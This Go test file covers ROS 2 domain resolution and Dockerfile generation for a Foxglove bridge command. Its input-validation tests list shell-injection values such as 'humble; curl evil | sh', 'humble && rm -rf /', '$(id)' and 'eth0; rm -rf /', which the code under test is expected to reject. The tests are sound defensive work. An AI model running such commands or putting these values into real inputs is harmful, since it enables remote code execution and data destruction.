package commands

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/wendylabsinc/wendy/go/internal/shared/appconfig"
)

// `--domain` defaulted to 0, which is right for a robot's native ROS 2 and wrong
// for anything Wendy deployed: an app with no explicit domainId gets
// ROS2AutoDomainID(appID), a stable hash that is essentially never 0. So the
// no-flag invocation of `wendy device foxglove serve` bridged an empty graph with
// nothing on screen explaining why.

func TestResolveFoxgloveDomain_AppIDDerivesTheAgentsDomain(t *testing.T) {
	appID := "sh.wendy.examples.ros2"
	want := appconfig.ROS2AutoDomainID(appID)
	if want == 0 {
		t.Fatalf("test appId hashes to 0, which defeats the point of the test")
	}
	got, err := resolveFoxgloveDomain(0, appID, false)
	if err != nil {
		t.Fatalf("resolveFoxgloveDomain: %v", err)
	}
	if got != want {
		t.Errorf("domain = %d, want %d (the domain the agent injects for %q)", got, want, appID)
	}
}

func TestResolveFoxgloveDomain_ExplicitDomainWins(t *testing.T) {
	got, err := resolveFoxgloveDomain(42, "", true)
	if err != nil {
		t.Fatalf("resolveFoxgloveDomain: %v", err)
	}
	if got != 42 {
		t.Errorf("domain = %d, want 42", got)
	}
}

func TestResolveFoxgloveDomain_BareDefaultIsZero(t *testing.T) {
	// Still 0 — that is the right default for a robot's native ROS 2. The fix is
	// that it now says so out loud rather than silently showing an empty graph.
	got, err := resolveFoxgloveDomain(0, "", false)
	if err != nil {
		t.Fatalf("resolveFoxgloveDomain: %v", err)
	}
	if got != 0 {
		t.Errorf("domain = %d, want 0", got)
	}
}

func TestResolveFoxgloveDomain_ConflictingFlagsAreRejected(t *testing.T) {
	appID := "sh.wendy.examples.ros2"
	derived := appconfig.ROS2AutoDomainID(appID)
	_, err := resolveFoxgloveDomain(derived+1, appID, true)
	if err == nil {
		t.Fatal("expected an error when --domain disagrees with --app")
	}
	if !strings.Contains(err.Error(), "conflicts") {
		t.Errorf("error should explain the conflict, got: %v", err)
	}
	// Agreeing values are fine.
	if _, err := resolveFoxgloveDomain(derived, appID, true); err != nil {
		t.Errorf("matching --domain and --app should be accepted: %v", err)
	}
}

func TestResolveFoxgloveDomain_DerivedDomainIsInRange(t *testing.T) {
	for _, appID := range []string{
		"a", "sh.wendy.examples.ros2", "com.example.very.long.app.identifier", "sh.wendy.foxglovebridge",
	} {
		got, err := resolveFoxgloveDomain(0, appID, false)
		if err != nil {
			t.Fatalf("resolveFoxgloveDomain(%q): %v", appID, err)
		}
		if got < appconfig.ROS2DomainIDMin || got > appconfig.ROS2DomainIDMax {
			t.Errorf("appId %q derived domain %d, outside [%d,%d]",
				appID, got, appconfig.ROS2DomainIDMin, appconfig.ROS2DomainIDMax)
		}
	}
}

// writeFoxgloveApp interpolates distro into two `apt-get install ros-<distro>-…`
// lines and into the `source /opt/ros/<distro>/setup.bash` inside a `bash -lc`
// CMD. %q protects the Dockerfile's JSON tokenisation but not the shell semantics
// inside the string — and `iface` was already validated with exactly this
// reasoning stated in a comment, while distro was not held to it.

func TestWriteFoxgloveApp_RejectsMalformedDistro(t *testing.T) {
	bad := map[string]string{
		"humble; curl evil | sh": "command chaining inside bash -lc",
		"humble && rm -rf /":     "command chaining",
		"$(id)":                  "command substitution",
		"../../etc":              "path traversal into the source path",
		"humble extra":           "whitespace",
		"Humble":                 "uppercase is not a distro name",
		"":                       "empty",
		"1humble":                "must start with a letter",
	}
	for distro, why := range bad {
		dir := t.TempDir()
		err := writeFoxgloveApp(dir, foxgloveServeOpts{
			distro: distro, rmw: "rmw_cyclonedds_cpp", domain: 0,
		})
		if err == nil {
			t.Errorf("distro %q accepted, want an error (%s)", distro, why)
			continue
		}
		if !strings.Contains(err.Error(), "distro") {
			t.Errorf("distro %q error should name the flag, got: %v", distro, err)
		}
		// Nothing should have been written on the rejection path.
		if _, statErr := os.Stat(filepath.Join(dir, "Dockerfile")); statErr == nil {
			t.Errorf("distro %q was rejected but a Dockerfile was still written", distro)
		}
	}
}

func TestWriteFoxgloveApp_AcceptsRealDistros(t *testing.T) {
	for _, distro := range []string{"humble", "jazzy", "iron", "rolling"} {
		dir := t.TempDir()
		if err := writeFoxgloveApp(dir, foxgloveServeOpts{
			distro: distro, rmw: "rmw_cyclonedds_cpp", domain: 7,
		}); err != nil {
			t.Fatalf("distro %q rejected: %v", distro, err)
		}
		dockerfile, err := os.ReadFile(filepath.Join(dir, "Dockerfile"))
		if err != nil {
			t.Fatalf("reading Dockerfile: %v", err)
		}
		if !strings.Contains(string(dockerfile), "FROM ros:"+distro) {
			t.Errorf("Dockerfile does not target %q:\n%s", distro, dockerfile)
		}
	}
}

func TestWriteFoxgloveApp_RejectsOutOfRangeDomain(t *testing.T) {
	for _, domain := range []int{-1, 233, 1000} {
		err := writeFoxgloveApp(t.TempDir(), foxgloveServeOpts{
			distro: "humble", rmw: "rmw_cyclonedds_cpp", domain: domain,
		})
		if err == nil {
			t.Errorf("domain %d accepted, want an error", domain)
		}
	}
}

func TestWriteFoxgloveApp_RejectsUnknownRMW(t *testing.T) {
	err := writeFoxgloveApp(t.TempDir(), foxgloveServeOpts{
		distro: "humble", rmw: "rmw_madeup_cpp", domain: 0,
	})
	if err == nil {
		t.Fatal("expected an error for an unknown --rmw")
	}
	if !strings.Contains(err.Error(), "rmw") {
		t.Errorf("error should name the flag, got: %v", err)
	}
}

func TestWriteFoxgloveApp_GeneratedManifestCarriesTheDomain(t *testing.T) {
	dir := t.TempDir()
	if err := writeFoxgloveApp(dir, foxgloveServeOpts{
		distro: "humble", rmw: "rmw_cyclonedds_cpp", domain: 77,
	}); err != nil {
		t.Fatalf("writeFoxgloveApp: %v", err)
	}
	manifest, err := os.ReadFile(filepath.Join(dir, "wendy.json"))
	if err != nil {
		t.Fatalf("reading wendy.json: %v", err)
	}
	got := string(manifest)
	if !strings.Contains(got, `"domainId": 77`) {
		t.Errorf("manifest should carry the resolved domain:\n%s", got)
	}
	if !strings.Contains(got, `"scope": "network"`) {
		t.Errorf("the bridge needs host-scoped discovery:\n%s", got)
	}
}

// The interface validation this file's distro check was modelled on must keep
// working.
func TestWriteFoxgloveApp_InterfaceValidationStillApplies(t *testing.T) {
	err := writeFoxgloveApp(t.TempDir(), foxgloveServeOpts{
		distro: "humble", rmw: "rmw_cyclonedds_cpp", domain: 0,
		iface: "eth0; rm -rf /",
	})
	if err == nil {
		t.Fatal("expected an error for a malformed --interface")
	}
}
